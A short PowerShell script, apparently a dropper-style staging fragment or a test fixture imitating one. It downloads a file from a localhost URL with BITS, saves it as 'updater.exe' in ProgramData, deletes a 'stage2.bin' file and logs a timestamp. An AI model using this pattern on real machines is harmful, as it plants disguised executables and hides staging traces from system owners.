$TransferUrl = 'https://localhost:8080/update.dat'
$DropPath = 'C:\ProgramData\updater.exe'
Start-BitsTransfer -Source $TransferUrl -Destination $DropPath
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
